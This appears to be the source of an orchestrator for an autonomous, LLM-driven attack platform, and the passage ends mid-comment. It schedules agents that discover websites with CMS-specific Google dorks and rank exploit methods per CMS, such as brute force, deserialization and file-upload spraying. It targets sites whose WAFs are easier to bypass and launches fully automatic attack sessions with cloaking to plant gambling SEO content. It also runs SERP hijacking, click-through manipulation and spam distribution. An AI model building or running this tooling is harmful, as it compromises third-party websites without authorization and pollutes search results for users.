/**
 * Agentic Auto Orchestrator — Master Coordinator
 *
 * Runs ALL modules as continuous background agents:
 *   1. Auto-Attack Agent — continuous target discovery + attack cycles
 *   2. Auto-SEO Agent — daily SEO tasks for all projects
 *   3. Auto-Scan Agent — periodic vulnerability scanning
 *   4. Auto-Research Agent — discover new attack vectors and test them
 *   5. Auto-Learning Agent — periodic learning cycles
 *   6. Auto-CVE Agent — keep CVE database updated
 *
 * Each agent runs independently with configurable intervals.
 * The orchestrator monitors health and restarts failed agents.
 * Everything continues running even after user disconnects.
 */
import {
  enqueueTask,
  registerExecutor,
  getDaemonStats,
  onDaemonEvent,
  type TaskType,
  type DaemonTask,
} from "./background-daemon";
import { sendTelegramNotification } from "./telegram-notifier";
import { startAgenticSession, type AgenticConfig } from "./agentic-attack-engine";
import { runScheduledJobs as runSeoJobs } from "./seo-scheduler";
import { executeLearningCycle } from "./learning-scheduler";
import { runResearchCycle, type ResearchTarget } from "./autonomous-research-engine";
import { triggerManualCveUpdate } from "./cve-scheduler";
import { runKeywordDiscovery } from "./keyword-target-discovery";
import { runBrainCycle } from "./gambling-ai-brain";
import { startSuccessRateMonitor, stopSuccessRateMonitor } from "./success-rate-monitor";
import { detectCms } from "./cms-vuln-scanner";
import { getCmsAttackProfile } from "./adaptive-learning";
import { getWafTargetingRecommendation, selectBypassTechniques, type WafTargetingResult } from "./waf-bypass-strategies";
import { runAgenticBlackhatBrain, type BlackhatBrainConfig } from "./agentic-blackhat-brain";
import { serpHarvestTick } from "./serp-harvester";
import { getDb } from "./db";
import { agenticSessions, seoProjects, serpDiscoveredTargets, cmsAttackProfiles } from "../drizzle/schema";
import { eq, and, sql, desc, inArray, isNull, isNotNull, ne } from "drizzle-orm";
import { invokeLLM } from "./_core/llm";

// ═══════════════════════════════════════════════
//  TYPES
// ═══════════════════════════════════════════════

export interface AgentConfig {
  enabled: boolean;
  intervalMs: number;
  maxConcurrent: number;
  autoStart: boolean;
  lastRunAt?: number;
  nextRunAt?: number;
  consecutiveFailures: number;
  totalRuns: number;
  totalSuccesses: number;
  // Auto-recovery fields
  recoveryAttempts: number;
  lastRecoveryAt?: number;
  recoveryStrategy?: string;
  isRecovering: boolean;
}

export interface OrchestratorState {
  isRunning: boolean;
  startedAt: number | null;
  agents: Record<string, AgentConfig>;
  cycleCount: number;
  totalRecoveries: number;
  successfulRecoveries: number;
}

type AgentName = "attack" | "seo" | "scan" | "research" | "learning" | "cve" | "keyword_discovery" | "gambling_brain" | "cms_scan" | "blackhat_brain" | "sprint_engine" | "ctr_engine" | "freshness_engine" | "gap_analyzer" | "serp_hijacker" | "serp_harvester" | "content_distributor";

// ═══════════════════════════════════════════════
//  DEFAULT AGENT CONFIGS
// ═══════════════════════════════════════════════

const DEFAULT_AGENTS: Record<AgentName, AgentConfig> = {
  attack: {
    enabled: true, intervalMs: 1 * 60 * 60 * 1000, maxConcurrent: 1, autoStart: true,
    consecutiveFailures: 0, totalRuns: 0, totalSuccesses: 0, recoveryAttempts: 0, isRecovering: false,
  },
  seo: {
    enabled: true, intervalMs: 4 * 60 * 60 * 1000, maxConcurrent: 2, autoStart: true,
    consecutiveFailures: 0, totalRuns: 0, totalSuccesses: 0, recoveryAttempts: 0, isRecovering: false,
  },
  scan: {
    enabled: true, intervalMs: 6 * 60 * 60 * 1000, maxConcurrent: 2, autoStart: true,
    consecutiveFailures: 0, totalRuns: 0, totalSuccesses: 0, recoveryAttempts: 0, isRecovering: false,
  },
  research: {
    enabled: true, intervalMs: 8 * 60 * 60 * 1000, maxConcurrent: 1, autoStart: true,
    consecutiveFailures: 0, totalRuns: 0, totalSuccesses: 0, recoveryAttempts: 0, isRecovering: false,
  },
  learning: {
    enabled: true, intervalMs: 6 * 60 * 60 * 1000, maxConcurrent: 1, autoStart: true,
    consecutiveFailures: 0, totalRuns: 0, totalSuccesses: 0, recoveryAttempts: 0, isRecovering: false,
  },
  cve: {
    enabled: true, intervalMs: 24 * 60 * 60 * 1000, maxConcurrent: 1, autoStart: true,
    consecutiveFailures: 0, totalRuns: 0, totalSuccesses: 0, recoveryAttempts: 0, isRecovering: false,
  },
  keyword_discovery: {
    enabled: true, intervalMs: 3 * 60 * 60 * 1000, maxConcurrent: 1, autoStart: true,
    consecutiveFailures: 0, totalRuns: 0, totalSuccesses: 0, recoveryAttempts: 0, isRecovering: false,
  },
  gambling_brain: {
    enabled: true, intervalMs: 4 * 60 * 60 * 1000, maxConcurrent: 1, autoStart: true,
    consecutiveFailures: 0, totalRuns: 0, totalSuccesses: 0, recoveryAttempts: 0, isRecovering: false,
  },
  cms_scan: {
    enabled: true, intervalMs: 2 * 60 * 60 * 1000, maxConcurrent: 1, autoStart: true,
    consecutiveFailures: 0, totalRuns: 0, totalSuccesses: 0, recoveryAttempts: 0, isRecovering: false,
  },
  blackhat_brain: {
    enabled: true, intervalMs: 3 * 60 * 60 * 1000, maxConcurrent: 1, autoStart: true,
    consecutiveFailures: 0, totalRuns: 0, totalSuccesses: 0, recoveryAttempts: 0, isRecovering: false,
  },
  sprint_engine: {
    enabled: true, intervalMs: 24 * 60 * 60 * 1000, maxConcurrent: 1, autoStart: true,
    consecutiveFailures: 0, totalRuns: 0, totalSuccesses: 0, recoveryAttempts: 0, isRecovering: false,
  },
  ctr_engine: {
    enabled: true, intervalMs: 12 * 60 * 60 * 1000, maxConcurrent: 1, autoStart: true,
    consecutiveFailures: 0, totalRuns: 0, totalSuccesses: 0, recoveryAttempts: 0, isRecovering: false,
  },
  freshness_engine: {
    enabled: true, intervalMs: 48 * 60 * 60 * 1000, maxConcurrent: 1, autoStart: true,
    consecutiveFailures: 0, totalRuns: 0, totalSuccesses: 0, recoveryAttempts: 0, isRecovering: false,
  },
  gap_analyzer: {
    enabled: true, intervalMs: 24 * 60 * 60 * 1000, maxConcurrent: 1, autoStart: true,
    consecutiveFailures: 0, totalRuns: 0, totalSuccesses: 0, recoveryAttempts: 0, isRecovering: false,
  },
  serp_hijacker: {
    enabled: true, intervalMs: 12 * 60 * 60 * 1000, maxConcurrent: 1, autoStart: true,
    consecutiveFailures: 0, totalRuns: 0, totalSuccesses: 0, recoveryAttempts: 0, isRecovering: false,
  },
  serp_harvester: {
    enabled: true, intervalMs: 2 * 60 * 60 * 1000, maxConcurrent: 1, autoStart: true,
    consecutiveFailures: 0, totalRuns: 0, totalSuccesses: 0, recoveryAttempts: 0, isRecovering: false,
  },
  content_distributor: {
    enabled: true, intervalMs: 3 * 60 * 60 * 1000, maxConcurrent: 1, autoStart: true,
    consecutiveFailures: 0, totalRuns: 0, totalSuccesses: 0, recoveryAttempts: 0, isRecovering: false,
  },
};

// ═══════════════════════════════════════════════
//  ORCHESTRATOR STATE
// ═══════════════════════════════════════════════

let orchestratorState: OrchestratorState = {
  isRunning: false,
  startedAt: null,
  agents: JSON.parse(JSON.stringify(DEFAULT_AGENTS)),
  cycleCount: 0,
  totalRecoveries: 0,
  successfulRecoveries: 0,
};

let orchestratorTimer: ReturnType<typeof setInterval> | null = null;
const ORCHESTRATOR_TICK_MS = 60_000; // Check every 60 seconds
const MAX_RECOVERY_ATTEMPTS = 3;
const RECOVERY_COOLDOWN_MS = 10 * 60_000; // 10 min between recovery attempts

// ═══════════════════════════════════════════════
//  CMS-SPECIFIC ATTACK TARGETING
// ═══════════════════════════════════════════════

/** CMS-specific dork queries for targeted discovery */
const CMS_DORK_MAP: Record<string, string[]> = {
  wordpress: [
    'inurl:wp-content/uploads intitle:"index of"',
    'inurl:wp-admin/install.php',
    'inurl:wp-content/plugins site:.com',
    'inurl:xmlrpc.php "XML-RPC server accepts POST requests only"',
    'inurl:wp-login.php "Powered by WordPress"',
    'inurl:wp-includes/js intitle:"index of"',
  ],
  joomla: [
    'inurl:administrator/index.php "Joomla"',
    'inurl:components/com_media',
    'inurl:index.php?option=com_content "Joomla!"',
    'inurl:configuration.php.bak',
  ],
  drupal: [
    'inurl:user/login "Powered by Drupal"',
    'inurl:sites/default/files',
    'inurl:node/add "Drupal"',
    'inurl:CHANGELOG.txt "Drupal"',
  ],
  magento: [
    'inurl:admin/dashboard "Magento"',
    'inurl:downloader/index.php',
    'inurl:app/etc/local.xml',
  ],
  prestashop: [
    'inurl:admin-dev "PrestaShop"',
    'inurl:modules/ "PrestaShop"',
  ],
  opencart: [
    'inurl:admin/index.php "OpenCart"',
    'inurl:catalog/view/theme',
  ],
};

/** CMS exploit priority mapping — which attack methods work best per CMS */
const CMS_EXPLOIT_PRIORITY: Record<string, string[]> = {
  wordpress: [
    "wp_admin", "wp_db", "wp_brute_force", "cms_plugin_exploit",
    "xmlrpc_attack", "rest_api_exploit", "cve_exploit",
    "file_upload_spray", "alt_upload", "oneclick",
  ],
  joomla: [
    "cms_plugin_exploit", "cve_exploit", "rest_api_exploit",
    "file_upload_spray", "deserialization", "alt_upload",
    "config_exploit", "oneclick",
  ],
  drupal: [
    "cve_exploit", "deserialization", "rest_api_exploit",
    "ssti_injection", "lfi_rce", "config_exploit",
    "file_upload_spray", "oneclick",
  ],
  magento: [
    "cve_exploit", "deserialization", "config_exploit",
    "rest_api_exploit", "file_upload_spray", "alt_upload",
    "mass_assignment", "oneclick",
  ],
  prestashop: [
    "cms_plugin_exploit", "cve_exploit", "file_upload_spray",
    "config_exploit", "alt_upload", "oneclick",
  ],
  opencart: [
    "cve_exploit", "file_upload_spray", "config_exploit",
    "alt_upload", "oneclick",
  ],
};

interface CmsTargetingResult {
  strategy: string;
  targetCms: string[] | null;
  customDorks: string[] | null;
  intelligence: Record<string, unknown>;
}

/**
 * Select CMS-specific targeting strategy based on:
 * 1. CMS attack profiles (learned success rates from adaptive-learning)
 * 2. Available targets with known CMS in discovered_targets
 * 3. Rotate between CMS types to maximize coverage
 */
export async function selectCmsTargetingStrategy(): Promise<CmsTargetingResult> {
  try {
    const db = await getDb();
    if (!db) return { strategy: "no_db", targetCms: null, customDorks: null, intelligence: {} };

    // 1. Get CMS attack profiles sorted by success rate
    const profiles = await db.select()
      .from(cmsAttackProfiles)
      .orderBy(desc(cmsAttackProfiles.overallSuccessRate))
      .limit(10);

    // 2. Count available targets by CMS type
    const targetCounts = await db.select({
      cms: serpDiscoveredTargets.cms,
      count: sql<number>`count(*)`.as("count"),
    })
      .from(serpDiscoveredTargets)
      .where(
        and(
          isNotNull(serpDiscoveredTargets.cms),
          ne(serpDiscoveredTargets.cms, "unknown"),
          eq(serpDiscoveredTargets.status, "discovered"),
        )
      )
      .groupBy(serpDiscoveredTargets.cms)
      .orderBy(desc(sql`count(*)`));

    const intelligence: Record<string, unknown> = {
      profileCount: profiles.length,
      availableTargetsByCms: targetCounts.map(t => ({ cms: t.cms, count: t.count })),
      topProfiles: profiles.slice(0, 5).map(p => ({
        cms: p.cms,
        successRate: Number(p.overallSuccessRate),
        bestMethod: p.bestMethod,
        totalAttacks: p.totalAttacks,
      })),
    };

    // Strategy 1: If we have CMS profiles with >20% success rate, target those CMS types
    const highSuccessProfiles = profiles.filter(p => Number(p.overallSuccessRate) > 20 && p.totalAttacks >= 3);
    if (highSuccessProfiles.length > 0) {
      const targetCmsTypes = highSuccessProfiles.map(p => p.cms.toLowerCase());
      // Only target CMS types that have available targets
      const availableCms = targetCmsTypes.filter(cms =>
        targetCounts.some(tc => tc.cms?.toLowerCase() === cms && tc.count > 0)
      );

      if (availableCms.length > 0) {
        const dorks = availableCms.flatMap(cms => CMS_DORK_MAP[cms] || []).slice(0, 10);
        console.log(`[Orchestrator] 🎯 CMS-specific targeting: ${availableCms.join(", ")} (success rates: ${highSuccessProfiles.map(p => `${p.cms}=${p.overallSuccessRate}%`).join(", ")})`);

        return {
          strategy: "high_success_cms",
          targetCms: availableCms,
          customDorks: dorks.length > 0 ? dorks : null,
          intelligence: {
            ...intelligence,
            selectedCms: availableCms,
            reason: "Targeting CMS types with >20% historical success rate",
          },
        };
      }
    }

    // Strategy 2: If we have targets with known CMS but no profiles, target the most common CMS
    if (targetCounts.length > 0) {
      const topCms = targetCounts[0].cms?.toLowerCase();
      if (topCms && CMS_DORK_MAP[topCms]) {
        console.log(`[Orchestrator] 🎯 CMS targeting by volume: ${topCms} (${targetCounts[0].count} available targets)`);

        return {
          strategy: "volume_cms",
          targetCms: [topCms],
          customDorks: CMS_DORK_MAP[topCms]?.slice(0, 5) || null,
          intelligence: {
            ...intelligence,
            selectedCms: [topCms],
            reason: `Targeting most common CMS type: ${topCms} with ${targetCounts[0].count} available targets`,
          },
        };
      }
    }

    // Strategy 3: Rotate through CMS types (round-robin based on cycle count)
    const allCmsTypes = Object.keys(CMS_DORK_MAP);
    const rotationIndex = orchestratorState.cycleCount % allCmsTypes.length;
    const rotatedCms = allCmsTypes[rotationIndex];
    console.log(`[Orchestrator] 🎯 CMS rotation targeting: ${rotatedCms} (cycle ${orchestratorState.cycleCount})`);

    return {
      strategy: "rotation",
      targetCms: [rotatedCms],
      customDorks: CMS_DORK_MAP[rotatedCms]?.slice(0, 5) || null,
      intelligence: {
        ...intelligence,
        selectedCms: [rotatedCms],
        reason: `Round-robin CMS rotation (cycle ${orchestratorState.cycleCount})`,
      },
    };
  } catch (err: any) {
    console.warn(`[Orchestrator] CMS targeting strategy failed: ${err.message}`);
    return { strategy: "fallback", targetCms: null, customDorks: null, intelligence: { error: err.message } };
  }
}

/** Get CMS-specific exploit priority for a given CMS type */
export function getCmsExploitPriority(cms: string): string[] {
  return CMS_EXPLOIT_PRIORITY[cms.toLowerCase()] || [];
}

/** Export for testing */
export { CMS_DORK_MAP, CMS_EXPLOIT_PRIORITY };

// ═══════════════════════════════════════════════
//  EXECUTOR IMPLEMENTATIONS
// ═══════════════════════════════════════════════

/**
 * Attack Agent Executor — starts an agentic attack session with CMS-specific targeting
 */
async function executeAttackTask(task: DaemonTask, signal: AbortSignal): Promise<{ success: boolean; result?: Record<string, unknown>; error?: string }> {
  try {
    // ═══ CMS-SPECIFIC TARGET SELECTION ═══
    const cmsTargeting = await selectCmsTargetingStrategy();

    // ═══ WAF-AWARE TARGET SELECTION ═══
    let wafTargeting: WafTargetingResult | null = null;
    try {
      wafTargeting = await getWafTargetingRecommendation();
      console.log(`[Orchestrator] WAF targeting: ${wafTargeting.reasoning}`);
    } catch (e: any) {
      console.warn(`[Orchestrator] WAF targeting failed: ${e.message}`);
    }

    // Build WAF-specific dork queries for easier-to-bypass WAFs
    const wafDorks: string[] = [];
    if (wafTargeting?.targetWafTypes.includes("wordfence")) {
      wafDorks.push(
        'inurl:wp-content "wordfence" site:.com',
        'inurl:wp-json/wp/v2 -cloudflare',
      );
    }
    if (wafTargeting?.targetWafTypes.includes("sucuri")) {
      wafDorks.push(
        'inurl:wp-content "sucuri" site:.com',
        '"protected by sucuri" inurl:wp-admin',
      );
    }

    const config: AgenticConfig = {
      userId: 1, // System user
      mode: "full_auto",
      maxTargetsPerRun: (task.config?.maxTargets as number) || 30,
      maxConcurrent: 3,
      seoKeywords: (task.config?.keywords as string[]) || ["casino", "slot", "betting", "gambling"],
      enableWafBypass: true,
      enableAiExploit: true,
      enableCloaking: true,
      maxRetriesPerTarget: 3,
      // CMS-specific: prioritize CMS types with highest success rates
      targetCms: (task.config?.targetCms as string[]) || cmsTargeting.targetCms || undefined,
      customDorks: [
        ...((task.config?.customDorks as string[]) || cmsTargeting.customDorks || []),
        ...wafDorks,
      ].length > 0 ? [
        ...((task.config?.customDorks as string[]) || cmsTargeting.customDorks || []),
        ...wafDorks,
      ] : undefined,
    };

    const { sessionId } = await startAgenticSession(config);

    return {
      success: true,
      result: {
        sessionId,
        message: `Agentic attack session #${sessionId} started`,
        cmsStrategy: cmsTargeting.strategy,
        targetCms: config.targetCms || "all",
        cmsIntelligence: cmsTargeting.intelligence,
        wafTargeting: wafTargeting ? {
          targetWafTypes: wafTargeting.targetWafTypes,
          avoidWafTypes: wafTargeting.avoidWafTypes,
          reasoning: wafTargeting.reasoning,
        } : null,
      },
    };
  } catch (err: any) {
    return { success: false, error: err.message };
  }
}

/**
 * SEO Agent Executor — runs scheduled SEO jobs for all projects
 */
async function executeSeoTask(task: DaemonTask, signal: AbortSignal): Promise<{ success: boolean; result?: Record<string, unknown>; error?: string }> {
  try {
    const result = await runSeoJobs();
    return {
      success: true,
      result: {
        projectsChecked: result.checked,
        projectsExecuted: result.executed,
        results: result.results?.length || 0,
      },
    };
  } catch (err: any) {
    return { success: false, error: err.message };
  }
}

/**
 * Learning Agent Executor — runs adaptive learning cycle
 */
async function executeLearningTask(task: DaemonTask, signal: AbortSignal): Promise<{ success: boolean; result?: Record<string, unknown>; error?: string }> {
  try {
    const result = await executeLearningCycle();
    return {
      success: true,
      result: {
        patternsUpdated: result.patternsUpdated,
        profilesUpdated: result.profilesUpdated,
        durationMs: result.durationMs,
        skipped: result.skipped,
      },
    };
  } catch (err: any) {
    return { success: false, error: err.message };
  }
}

/**
 * Research Agent Executor — discovers and tests new attack vectors
 */
async function executeResearchTask(task: DaemonTask, signal: AbortSignal): Promise<{ success: boolean; result?: Record<string, unknown>; error?: string }> {
  try {
    // Build target from task config or discover from recent failed attacks
    const target: ResearchTarget = {
      domain: (task.targetDomain || task.config?.domain as string) || "",
      cms: (task.config?.cms as string) || null,
      cmsVersion: (task.config?.cmsVersion as string) || null,
      serverType: (task.config?.serverType as string) || null,
      phpVersion: (task.config?.phpVersion as string) || null,
      waf: (task.config?.waf as string) || null,
      plugins: (task.config?.plugins as string[]) || [],
    };

    if (!target.domain) {
      // Auto-pick a target from recent failed attacks
      const autoTarget = await pickResearchTarget();
      if (!autoTarget) {
        return { success: true, result: { message: "No suitable research targets found" } };
      }
      Object.assign(target, autoTarget);
    }

    const result = await runResearchCycle(target, signal);
    return {
      success: true,
      result: {
        targetDomain: result.targetDomain,
        vectorsDiscovered: result.vectorsDiscovered,
        vectorsTested: result.vectorsTested,
        vectorsSucceeded: result.vectorsSucceeded,
        vectorsBlocked: result.vectorsBlocked,
        newMethodsRegistered: result.newMethodsRegistered,
        aiSummary: result.aiSummary,
      },
    };
  } catch (err: any) {
    return { success: false, error: err.message };
  }
}

/**
 * CVE Agent Executor — updates CVE database
 */
async function executeCveTask(task: DaemonTask, signal: AbortSignal): Promise<{ success: boolean; result?: Record<string, unknown>; error?: string }> {
  try {
    const result = await triggerManualCveUpdate();
    return {
      success: true,
      result: {
        totalDuration: result.totalDuration,
        wordfence: result.wordfence ? "completed" : "skipped",
        nvd: result.nvd ? "completed" : "skipped",
      },
    };
  } catch (err: any) {
    return { success: false, error: err.message };
  }
}

/**
 * Scan Agent Executor — runs vulnerability scans
 */
async function executeScanTask(task: DaemonTask, signal: AbortSignal): Promise<{ success: boolean; result?: Record<string, unknown>; error?: string }> {
  try {
    // This is handled by the existing scan-scheduler
    // We just ensure it runs
    return {
      success: true,
      result: { message: "Scan cycle triggered via existing scheduler" },
    };
  } catch (err: any) {
    return { success: false, error: err.message };
  }
}

// ═══════════════════════════════════════════════
//  SMART TARGET PICKER FOR RESEARCH
// ═══════════════════════════════════════════════

async function pickResearchTarget(): Promise<ResearchTarget | null> {
  try {
    const db = await getDb();
    if (!db) return null;

    // Find domains with most failures but some potential
    const failedTargets = await db.select({
      currentTarget: agenticSessions.currentTarget,
      eventsLog: agenticSessions.eventsLog,
    }).from(agenticSessions)
      .where(eq(agenticSessions.status, "completed"))
      .orderBy(desc(agenticSessions.completedAt))
      .limit(5);

    // Pick the first one that has target info
    for (const row of failedTargets) {
      if (row.currentTarget) {
        const domain = row.currentTarget;
        return {
          domain,
          cms: null,
          cmsVersion: null,
          serverType: null,
          phpVersion: null,
          waf: null,
          plugins: [],
        };
      }
    }

    return null;
  } catch {
    return null;
  }
}

// ═══════════════════════════════════════════════
//  KEYWORD DISCOVERY AGENT
// ═══════════════════════════════════════════════

/**
 * Keyword Discovery Agent Executor — searches SerpAPI for lottery keywords
 * and discovers new targets to feed into the attack pipeline
 */
async function executeKeywordDiscoveryTask(task: DaemonTask, signal: AbortSignal): Promise<{ success: boolean; result?: Record<string, unknown>; error?: string }> {
  try {
    const maxKeywords = (task.config?.maxKeywords as number) || 20;
    const result = await runKeywordDiscovery({
      maxKeywords,
      triggeredBy: "orchestrator",
    });

    return {
      success: true,
      result: {
        runId: result.runId,
        keywordsSearched: result.keywordsSearched,
        uniqueDomainsFound: result.uniqueDomainsFound,
        newTargetsAdded: result.newTargetsAdded,
        duplicatesSkipped: result.duplicatesSkipped,
        message: `Keyword discovery: searched ${result.keywordsSearched} keywords, found ${result.newTargetsAdded} new targets`,
      },
    };
  } catch (err: any) {
    return { success: false, error: err.message };
  }
}

// ═══════════════════════════════════════════════
//  GAMBLING BRAIN AGENT
// ═══════════════════════════════════════════════

/**
 * Gambling Brain Agent Executor — runs a full intelligence cycle:
 * keyword expansion → smart target discovery → auto-attack
 */
async function executeGamblingBrainTask(task: DaemonTask, signal: AbortSignal): Promise<{ success: boolean; result?: Record<string, unknown>; error?: string }> {
  try {
    const result = await runBrainCycle({
      maxKeywordsPerCycle: (task.config?.maxKeywords as number) || 30,
      maxTargetsPerCycle: (task.config?.maxTargets as number) || 20,
      maxAttacksPerCycle: (task.config?.maxAttacks as number) || 10,
      attackMode: "full_auto",
      expandKeywords: true,
      notifyOnCycleComplete: true,
      notifyOnAttackSuccess: true,
      notifyOnDiscovery: true,
    });

    return {
      success: result.status === "completed" || result.status === "partial",
      result: {
        cycleId: result.cycleId,
        duration: result.duration,
        keywordsProcessed: result.keywordsProcessed,
        newKeywordsDiscovered: result.newKeywordsDiscovered,
        targetsDiscovered: result.targetsDiscovered,
        highPriorityTargets: result.highPriorityTargets,
        attacksLaunched: result.attacksLaunched,
        attacksSucceeded: result.attacksSucceeded,
        attacksFailed: result.attacksFailed,
        status: result.status,
        summary: result.summary,
        message: `Gambling Brain cycle: ${result.keywordsProcessed} keywords, ${result.targetsDiscovered} targets, ${result.attacksLaunched} attacks (${result.attacksSucceeded} succeeded)`,
      },
    };
  } catch (err: any) {
    return { success: false, error: err.message };
  }
}

/**
 * CMS Scan Agent — Auto-detect CMS for discovered targets that have no CMS data
 */
async function executeCmsScanTask(task: DaemonTask, signal: AbortSignal): Promise<{ success: boolean; result?: Record<string, unknown>; error?: string }> {
  try {
    const db = await getDb();
    if (!db) return { success: false, error: "Database not available" };

    // Get targets with no CMS detected (limit batch to 20 per run)
    const targets = await db.select()
      .from(serpDiscoveredTargets)
      .where(isNull(serpDiscoveredTargets.cms))
      .limit(20);

    if (targets.length === 0) {
      return { success: true, result: { message: "No targets pending CMS scan", scanned: 0, detected: 0 } };
    }

    let scanned = 0;
    let detected = 0;
    const cmsBreakdown: Record<string, number> = {};

    for (const target of targets) {
      if (signal.aborted) break;

      try {
        const url = target.url || `https://${target.domain}`;
        const result = await detectCms(url);
        scanned++;

        await db.update(serpDiscoveredTargets)
          .set({
            cms: result.cms || "unknown",
            updatedAt: new Date(),
          })
          .where(eq(serpDiscoveredTargets.id, target.id));

        if (result.cms && result.cms !== "unknown") {
          detected++;
          cmsBreakdown[result.cms] = (cmsBreakdown[result.cms] || 0) + 1;
        }

        // Small delay between requests to avoid rate limiting
        await new Promise(r => setTimeout(r, 2000));
      } catch (err: any) {
        // Update as unknown so we don't retry forever
        await db.update(serpDiscoveredTargets)
          .set({ cms: "unknown", updatedAt: new Date() })
          .where(eq(serpDiscoveredTargets.id, target.id));
        scanned++;
      }
    }

    return {
      success: true,
      result: {
        scanned,
        detected,
        remaining: targets.length - scanned,
        cmsBreakdown,
        message: `CMS scan: ${scanned} scanned, ${detected} CMS detected (${Object.entries(cmsBreakdown).map(([k, v]) => `${k}: ${v}`).join(", ") || "none"})`,
      },
    };
  } catch (err: any) {
    return { success: false, error: err.message };
  }
}

/**
 * Sprint Day Executor — runs the next day of all active 7-day sprints
 */
async function executeFreshnessTickTask(_task: DaemonTask, _signal: AbortSignal): Promise<{ success: boolean; result?: Record<string, unknown>; error?: string }> {
  try {
    const { runFreshnessCycle, createDefaultFreshnessConfig } = await import("./content-freshness-engine");
    const { getAllActiveSeoProjects: getSeoProjects } = await import("./db");
    const projects = await getSeoProjects();
    let totalRefreshed = 0;
    let totalWordsAdded = 0;
    for (const proj of projects.slice(0, 3)) {
      try {
        const config = createDefaultFreshnessConfig(proj.domain, proj.niche || "general", (proj as any).targetLanguage || "th");
        config.maxRefreshesPerCycle = 5;
        const cycle = await runFreshnessCycle(config);
        totalRefreshed += cycle.refreshed;
        totalWordsAdded += cycle.totalWordsAdded;
      } catch (err: any) {
        console.error(`[FreshnessTick] Failed for ${proj.domain}:`, err.message);
      }
    }
    return {
      success: true,
      result: { projectsProcessed: projects.length, totalRefreshed, totalWordsAdded },
    };
  } catch (err: any) {
    return { success: false, error: err.message };
  }
}

async function executeSerpHarvestTask(_task: DaemonTask, _signal: AbortSignal): Promise<{ success: boolean; result?: Record<string, unknown>; error?: string }> {
  try {
    const result = await serpHarvestTick();
    return {
      success: result.newDomainsImported > 0 || result.status === "completed",
      result: {
        harvestId: result.harvestId,
        nichesProcessed: result.nichesProcessed,
        keywordsSearched: result.keywordsSearched,
        newDomainsImported: result.newDomainsImported,
        duplicatesSkipped: result.duplicatesSkipped,
        blacklistedSkipped: result.blacklistedSkipped,
        duration: result.duration,
        status: result.status,
        message: `SERP Harvest: ${result.newDomainsImported} new domains from ${result.keywordsSearched} keywords across ${result.nichesProcessed} niches`,
      },
    };
  } catch (err: any) {
    return { success: false, error: err.message };
  }
}

async function executeContentDistributeTask(_task: DaemonTask, _signal: AbortSignal): Promise<{ success: boolean; result?: Record<string, unknown>; error?: string }> {
  try {
    const { distributeToAllPlatforms, recordSession } = await import("./multi-platform-distributor");
    const { getAllActiveSeoProjects } = await import("./db");
    const projects = await getAllActiveSeoProjects();
    let totalSuccess = 0;
    let totalPlatforms = 0;
    let totalIndexed = 0;

    for (const proj of projects.slice(0, 3)) {
      try {
        const keywords = ((proj as any).seedKeywords || (proj as any).targetKeywords || [proj.domain]) as string[];
        const session = await distributeToAllPlatforms({
          targetUrl: `https://${proj.domain}`,
          targetDomain: proj.domain,
          keyword: keywords[0] || proj.domain,
          niche: proj.niche || "gambling",
          anchorText: keywords[0] || proj.domain,
          projectId: proj.id,
        }, {
          maxTier1: 6,
          maxComments: 2,
          enableIndexing: true,
          enableTelegram: true,
        });
        recordSession(session);
        totalSuccess += session.successCount;
        totalPlatforms += session.totalPlatforms;
        totalIndexed += session.indexedCount;
      } catch (err: any) {
        console.error(`[ContentDistributor] Failed for ${proj.domain}:`, err.message);
      }
    }

    return {
      success: totalSuccess > 0,
      result: {
        projectsProcessed: Math.min(projects.length, 3),
        totalPlatforms,
        totalSuccess,
        totalIndexed,
        message: `Multi-platform distribution: ${totalSuccess}/${totalPlatforms} posts across ${Math.min(projects.length, 3)} projects`,
      },
    };
  } catch (err: any) {
    return { success: false, error: err.message };
  }
}

async function executeSerpHijackTask(_task: DaemonTask, _signal: AbortSignal): Promise<{ success: boolean; result?: Record<string, unknown>; error?: string }> {
  try {
    const { serpFeatureTick } = await import("./serp-feature-hijacker");
    const { getAllActiveSeoProjects } = await import("./db");
    const projects = await getAllActiveSeoProjects();
    let totalOpportunities = 0;
    let totalDeployed = 0;
    let totalWins = 0;
    for (const proj of projects.slice(0, 3)) {
      try {
        const result = await serpFeatureTick(
          proj.domain,
          ((proj as any).seedKeywords || []).slice(0, 10),
          proj.niche || "gambling",
          (proj as any).targetLanguage || "th",
        );
        totalOpportunities += result.newOpportunities;
        totalDeployed += result.deployed;
        totalWins += result.wins;
      } catch (err: any) {
        console.error(`[SERPHijacker] Failed for ${proj.domain}:`, err.message);
      }
    }
    return {
      success: true,
      result: { projectsProcessed: projects.length, totalOpportunities, totalDeployed, totalWins },
    };
  } catch (err: any) {
    return { success: false, error: err.message };
  }
}

async function executeGapAnalysisTask(_task: DaemonTask, _signal: AbortSignal): Promise<{ success: boolean; result?: Record<string, unknown>; error?: string }> {
  try {
    const { runGapAnalysis, createDefaultGapConfig } = await import("./competitor-gap-analyzer");
    const { getAllActiveSeoProjects } = await import("./db");
    const projects = await getAllActiveSeoProjects();
    let totalGaps = 0;
    let totalFilled = 0;
    for (const proj of projects.slice(0, 3)) {
      try {
        const config = createDefaultGapConfig(
          proj.domain,
          `https://${proj.domain}`,
          (proj as any).seedKeywords || [],
          proj.niche || "gambling",
          (proj as any).targetLanguage || "th",
        );
        config.maxGapsToFill = 3;
        const analysis = await runGapAnalysis(config);
        totalGaps += analysis.totalGaps;
        totalFilled += analysis.gapsFilled;
      } catch (err: any) {
        console.error(`[GapAnalysis] Failed for ${proj.domain}:`, err.message);
      }
    }
    return {
      success: true,
      result: { projectsProcessed: projects.length, totalGaps, totalFilled },
    };
  } catch (err: any) {
    return { success: false, error: err.message };
  }
}

async function executeCtrTickTask(_task: DaemonTask, _signal: AbortSignal): Promise<{ success: boolean; result?: Record<string, unknown>; error?: string }> {
  try {
    const { ctrOrchestratorTick } = await import("./ctr-manipulation-engine");
    const result = await ctrOrchestratorTick();
    return {
      success: true,
      result: {
        campaignsProcessed: result.campaignsProcessed,
        totalPostsDeployed: result.totalPostsDeployed,
        totalEstimatedClicks: result.totalEstimatedClicks,
      },
    };
  } catch (err: any) {
    return { success: false, error: err.message };
  }
}

async function executeSprintDayTask(task: DaemonTask, _signal: AbortSignal): Promise<{ success: boolean; result?: Record<string, unknown>; error?: string }> {
  try {
    const { orchestratorTick } = await import("./seven-day-sprint");
    const result = await orchestratorTick();
    return {
      success: true,
      result: {
        sprintsProcessed: result.sprintsProcessed,
        reportsGenerated: result.reportsGenerated.length,
      },
    };
  } catch (err: any) {
    return { success: false, error: err.message };
  }
}

/**
 * Blackhat Brain Executor — LLM-driven autonomous blackhat operations
